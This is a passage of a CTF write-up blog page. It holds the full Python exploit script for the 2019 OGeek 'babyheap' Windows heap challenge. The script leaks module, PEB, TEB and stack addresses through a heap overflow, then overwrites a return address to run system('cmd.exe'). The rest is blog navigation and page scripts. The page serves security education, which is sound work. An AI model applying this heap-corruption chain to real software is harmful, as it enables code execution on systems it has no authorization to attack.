class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> r.recv(num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">prefix,drop = <span class="literal">True</span></span>):</span><br><span class="line">    data = r.recvuntil(prefix)</span><br><span class="line">    <span class="keyword">if</span> drop:</span><br><span class="line">        <span class="keyword">return</span> data[:-<span class="built_in">len</span>(prefix)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">content</span>):</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sda</span>(<span class="params">prefix,content</span>):</span><br><span class="line">    ru(prefix)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">prefix,content</span>):</span><br><span class="line">    ru(prefix)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>(<span class="params">name,content</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span> : <span class="subst">&#123;<span class="built_in">hex</span>(content)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;What&#x27;s your choice?\r\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;How long is your sword?\r\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    sla(<span class="string">&quot;Well done! Name it!\r\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which sword do you want to destroy?\r\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which one will you polish?\r\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;And what&#x27;s the length this time?\r\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(data) + <span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Then name it again : \r\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which one will you check?\r\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">1337</span>)</span><br><span class="line">    sla(<span class="string">&quot;So what&#x27;s your target?\r\n&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./babyheap.exe&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;And here is your Novice village gift : 0x&quot;</span>)</span><br><span class="line">exe_base = <span class="built_in">int</span>(ru(<span class="string">&quot;\r\n&quot;</span>),<span class="number">16</span>) - <span class="number">0x1090</span></span><br><span class="line">success(<span class="string">&quot;exe_base&quot;</span>,exe_base)</span><br><span class="line"></span><br><span class="line">chunk_list = exe_base + <span class="number">0x4370</span></span><br><span class="line">chunk_used_list = exe_base + <span class="number">0x43BC</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;0&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;5&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;6&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;7&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;8&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&quot;</span> * <span class="number">0x70</span></span><br><span class="line">leak = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>,payload + i * <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(payload)</span><br><span class="line">    data = ru(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="built_in">len</span>(leak):</span><br><span class="line">        leak += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        leak += data[i]</span><br><span class="line">leak = u64(leak)</span><br><span class="line">success(<span class="string">&quot;leak&quot;</span>,leak)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&quot;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(leak)</span><br><span class="line">payload += p32(chunk_list)</span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">exit_iat = exe_base + <span class="number">0x30AC</span></span><br><span class="line">IsDebuggerPresent_iat = exe_base + <span class="number">0x3010</span></span><br><span class="line"></span><br><span class="line">backdoor(chunk_used_list + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(exit_iat) <span class="comment"># exit</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(IsDebuggerPresent_iat) <span class="comment"># IsDebuggerPresent</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">ucrtbase_base = u32(rc(<span class="number">4</span>)) - <span class="number">0x44380</span></span><br><span class="line">success(<span class="string">&quot;ucrtbase_base&quot;</span>,ucrtbase_base)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">kernel32_base = u32(rc(<span class="number">4</span>)) - <span class="number">0x220d0</span></span><br><span class="line">success(<span class="string">&quot;kernel32_base&quot;</span>,kernel32_base)</span><br><span class="line"></span><br><span class="line">NtCreateFile_iat = kernel32_base + <span class="number">0x00081fb4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(NtCreateFile_iat) <span class="comment"># NtCreateFile</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">ntdll_base = u32(rc(<span class="number">4</span>)) - <span class="number">0x72f20</span></span><br><span class="line">success(<span class="string">&quot;ntdll_base&quot;</span>,ntdll_base)</span><br><span class="line"></span><br><span class="line">ntdll_PedLdr_addr = ntdll_base + <span class="number">0x125d80</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(ntdll_PedLdr_addr - <span class="number">0x64</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">peb_addr = u32(ru(<span class="string">&quot;\r\n&quot;</span>).ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x154</span></span><br><span class="line">success(<span class="string">&quot;peb_addr&quot;</span>,peb_addr)</span><br><span class="line"></span><br><span class="line">teb_addr = peb_addr + <span class="number">0x3000</span></span><br><span class="line">success(<span class="string">&quot;teb_addr&quot;</span>,teb_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(teb_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">stack_addr = u32(ru(<span class="string">&quot;\r\n&quot;</span>).ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x154</span></span><br><span class="line">success(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">ret_addr = stack_addr + <span class="number">0x220</span></span><br><span class="line">success(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(ret_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">system_addr = ucrtbase_base + <span class="number">0xec730</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(ret_addr + <span class="number">0xc</span>)</span><br><span class="line">payload += <span class="string">&quot;cmd.exe\x00&quot;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># windbgx.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dc babyheap + 0x4370</span></span><br><span class="line"><span class="comment"># bp babyheap + 0x11B8</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Vergissmeinnicht</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ret2ver.github.io/2021/10/07/2019OGeek-babyheap/">https://ret2ver.github.io/2021/10/07/2019OGeek-babyheap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/Back-End/">Back-End</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/27/HEVD-Buffer-Overflow-Stack/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">HEVD - Buffer Overflow Stack</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/05/2017HITB-GSEC-babyshellcode/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2017HITB GSEC - babyshellcode</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/01/PE32-Advanced-stack-buffer-overflow/" title="PE32 - Advanced stack buffer overflow"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-01</div><div class="title">PE32 - Advanced stack buffer overflow</div></div></a></div><div><a href="/2021/10/02/2020%E5%BC%BA%E7%BD%91%E6%9D%AF-easyoverflow/" title="2020强网杯 - easyoverflow"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-02</div><div class="title">2020强网杯 - easyoverflow</div></div></a></div><div><a href="/2021/10/03/2017HITB-GSEC-babystack/" title="2017HITB GSEC - babystack"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-03</div><div class="title">2017HITB GSEC - babystack</div></div></a></div><div><a href="/2021/10/04/2017Insomnihack-easywin/" title="2017Insomnihack - easywin"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-04</div><div class="title">2017Insomnihack - easywin</div></div></a></div><div><a href="/2021/10/05/2017HITB-GSEC-babyshellcode/" title="2017HITB GSEC - babyshellcode"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-05</div><div class="title">2017HITB GSEC - babyshellcode</div></div></a></div><div><a href="/2021/09/01/2017CISCN-babydriver/" title="2017CISCN - babydriver"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-01</div><div class="title">2017CISCN - babydriver</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Vergissmeinnicht</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ret2ver"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ret2ver" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:verhan@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Live Long And Pwn.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-fuzz/" title="AFL源码阅读 - afl-fuzz">AFL源码阅读 - afl-fuzz</a><time datetime="2022-03-14T09:35:50.000Z" title="Created 2022-03-14 17:35:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-clang-fast/" title="AFL源码阅读 - afl-clang-fast">AFL源码阅读 - afl-clang-fast</a><time datetime="2022-03-14T06:47:50.000Z" title="Created 2022-03-14 14:47:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-as/" title="AFL源码阅读 - afl-as">AFL源码阅读 - afl-as</a><time datetime="2022-03-13T07:04:50.000Z" title="Created 2022-03-13 15:04:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-gcc/" title="AFL源码阅读 - afl-gcc">AFL源码阅读 - afl-gcc</a><time datetime="2022-03-13T05:22:50.000Z" title="Created 2022-03-13 13:22:50">2022-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/05/CVE-2021-43226-%EF%BC%9ACLFS-%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" title="CVE-2021-43226 ：CLFS 中的栈溢出漏洞">CVE-2021-43226 ：CLFS 中的栈溢出漏洞</a><time datetime="2022-02-05T06:56:21.000Z" title="Created 2022-02-05 14:56:21">2022-02-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Vergissmeinnicht</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>